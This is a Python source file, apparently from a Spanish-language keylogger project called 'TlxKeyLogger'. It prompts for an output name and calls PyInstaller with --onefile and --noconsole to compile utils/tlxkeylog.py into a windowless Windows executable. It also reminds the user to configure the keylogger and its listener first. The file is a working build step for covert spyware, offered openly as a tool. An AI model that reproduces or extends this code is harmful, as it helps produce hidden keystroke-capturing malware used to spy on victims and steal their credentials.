import subprocess
import time
from utils import printcolor

def compile():
    printcolor.printl("[bold white][[/bold white][blink bold green]*[/blink bold green][bold white]][/bold white] ASEGURESE DE CONFIGURAR [bold white]utils/tlxkeylog.py[/bold white] Y [bold white]utils/listener.py[/bold white] ANTES DE COMPILAR", justify="left", style="bold green")
    time.sleep(3)
    printcolor.printl("[bold white][[/bold white][blink bold green]*[/blink bold green][bold white]][/bold white] INGRESE UN NOMBRE PARA EL ARCHIVO", justify="left", style="bold green")
    NameFile = str(input(">>> "))
    if NameFile != "":
        if len(NameFile) <= 4:
            printcolor.printl("[bold white][[/bold white][blink bold yellow]*[/blink bold yellow][bold white]][/bold white] EL NOMBRE DEBE CONTENER MINIMO 5 CARACTERES <<< para volver al menú.", justify="left", style="bold green")
            time.sleep(3)
            ValidName = False
            compile()
        else:
            ValidName = True
    else:
        NameFile = "TlxKeyLogger"
        ValidName = True
    
    if ValidName:
        printcolor.printl("[bold white][[/bold white][blink bold green]*[/blink bold green][bold white]][/bold white] COMPILANDO A .EXE", justify="left", style="bold green")
        try:
            subprocess.run([
                "pyinstaller",
                "--onefile",
                "--noconsole",
                "--name", NameFile,
                "--collect-all", "utils",
                r"utils\tlxkeylog.py"
            ])
            printcolor.printl("[bold white][[/bold white][blink bold green]*[/blink bold green][bold white]][/bold white] COMPILADO A .EXE", justify="left", style="bold green")
            printcolor.printl("[bold white][[/bold white][blink bold green]*[/blink bold green][bold white]][/bold white] DISPONIBLE EN [bold white]cd tlxkeylog/dist[/bold white]", justify="left", style="bold green")
        except:
            printcolor.printl("[bold white][[/bold white][blink bold red]![/blink bold red][bold white]][/bold white] ERROR", justify="left", style="bold red")
            time.sleep(2)
            printcolor.printl("[bold white][[/bold white][blink bold yellow]*[/blink bold yellow][bold white]][/bold white] Presione >>> [blink]ENTER[/blink] <<< para volver al menú.", justify="left", style="bold green")
    else:
        printcolor.printl("[bold white][[/bold white][blink bold red]![/blink bold red][bold white]][/bold white] ERROR", justify="left", style="bold red")
    
    
    
    
    
    
    
    
